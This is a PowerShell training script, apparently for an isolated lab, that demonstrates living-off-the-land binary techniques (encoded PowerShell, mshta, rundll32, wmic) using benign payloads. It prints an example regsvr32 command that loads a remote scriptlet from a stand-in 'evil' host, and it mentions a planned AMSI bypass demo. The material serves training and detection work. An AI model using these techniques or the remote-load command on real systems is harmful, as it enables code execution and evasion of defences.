<#
.SYNOPSIS
    Educational demonstration of common Living-Off-the-Land Binaries (LOLBins).

.DESCRIPTION
    Safely demonstrates several LOLBin techniques commonly abused for execution.
    All actions are benign (whoami, system info, or creating a simple marker file).
    Designed for authorized lab use only (SANS SEC504 or equivalent isolated VM).

.NOTES
    Author: B. Underhill
    MITRE ATT&CK: 
        T1059  - Command and Scripting Interpreter
        T1218  - System Binary Proxy Execution
        T1047  - Windows Management Instrumentation
    Lab only. Never run on production or unauthorized systems.

.EXAMPLE
    .\Invoke-LolbinDemo.ps1
#>

#Requires -Version 5.1

[CmdletBinding()]
param(
    [switch]$SkipPause
)

function Write-Banner {
    param([string]$Text)
    Write-Host "`n========================================" -ForegroundColor Cyan
    Write-Host " $Text" -ForegroundColor Cyan
    Write-Host "========================================" -ForegroundColor Cyan
}

function Write-Section {
    param([string]$Text)
    Write-Host "`n--- $Text ---" -ForegroundColor Yellow
}

# ========================
# Ethical Warning
# ========================
Clear-Host
Write-Host "===============================================================" -ForegroundColor Red
Write-Host "  EDUCATIONAL / LAB USE ONLY" -ForegroundColor Red
Write-Host "  This script demonstrates LOLBin techniques with benign actions." -ForegroundColor Red
Write-Host "  Do NOT run on production or unauthorized systems." -ForegroundColor Red
Write-Host "===============================================================" -ForegroundColor Red
Write-Host ""

if (-not $SkipPause) {
    $confirm = Read-Host "Type YES to continue in your isolated lab"
    if ($confirm -ne "YES") {
        Write-Host "Aborted." -ForegroundColor Yellow
        exit
    }
}

$MarkerPath = "$env:TEMP\LOLBin_Demo_Marker.txt"
"LOLBin demo ran at $(Get-Date)" | Out-File -FilePath $MarkerPath -Encoding utf8

Write-Banner "LOLBin Execution Demonstration"
Write-Host "Marker file created: $MarkerPath" -ForegroundColor Green

# ========================
# 1. PowerShell Encoded Command
# ========================
Write-Section "1. PowerShell Encoded Command (T1059.001)"

$Command = "Write-Host 'Encoded PowerShell command executed successfully' -ForegroundColor Green; whoami"
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Command)
$Encoded = [Convert]::ToBase64String($Bytes)

Write-Host "Running encoded PowerShell command..." -ForegroundColor Gray
powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand $Encoded

# ========================
# 2. mshta
# ========================
Write-Section "2. mshta (T1218.005)"

Write-Host "Demonstrating mshta with a simple JavaScript one-liner (benign)..." -ForegroundColor Gray
# This pops a simple message box and exits – fully benign
$mshtaCommand = 'mshta.exe javascript:alert("mshta LOLBin demo - benign");close();'
Write-Host "Command: $mshtaCommand" -ForegroundColor DarkGray
Start-Process -FilePath "mshta.exe" -ArgumentList 'javascript:alert("mshta LOLBin demo - benign");close();' -Wait

# ========================
# 3. rundll32
# ========================
Write-Section "3. rundll32 (T1218.011)"

Write-Host "Using rundll32 to call a benign Windows API (printui.dll)..." -ForegroundColor Gray
# printui.dll is a common benign example; we just show the technique
Start-Process -FilePath "rundll32.exe" -ArgumentList "printui.dll,PrintUIEntry /?" -Wait -NoNewWindow
Write-Host "rundll32 executed (opened print UI help - benign)." -ForegroundColor Green

# ========================
# 4. regsvr32 (silent, benign)
# ========================
Write-Section "4. regsvr32 (T1218.010)"

Write-Host "regsvr32 is often abused with remote scrobj.dll. Showing the binary call pattern only." -ForegroundColor Gray
Write-Host "In a real attack this would load a malicious SCT. Here we only demonstrate the binary." -ForegroundColor Gray
# We deliberately do NOT load any remote content
Write-Host "Example (not executed): regsvr32 /s /n /u /i:http://evil/file.sct scrobj.dll" -ForegroundColor DarkGray
Write-Host "Skipping actual regsvr32 remote load for safety." -ForegroundColor Yellow

# ========================
# 5. wmic
# ========================
Write-Section "5. wmic (T1047)"

Write-Host "Running benign wmic command..." -ForegroundColor Gray
wmic os get caption,version /value
Write-Host "wmic executed successfully." -ForegroundColor Green

# ========================
# Summary
# ========================
Write-Banner "Demo Complete"
Write-Host "All demonstrated techniques used benign actions only." -ForegroundColor Green
Write-Host "Marker file: $MarkerPath" -ForegroundColor Cyan
Write-Host ""
Write-Host "MITRE ATT&CK Coverage:" -ForegroundColor White
Write-Host "  T1059   - Command and Scripting Interpreter"
Write-Host "  T1218   - System Binary Proxy Execution"
Write-Host "  T1047   - Windows Management Instrumentation"
Write-Host ""
Write-Host "Next: Build the matching detection script and the simple AMSI bypass demo." -ForegroundColor Cyan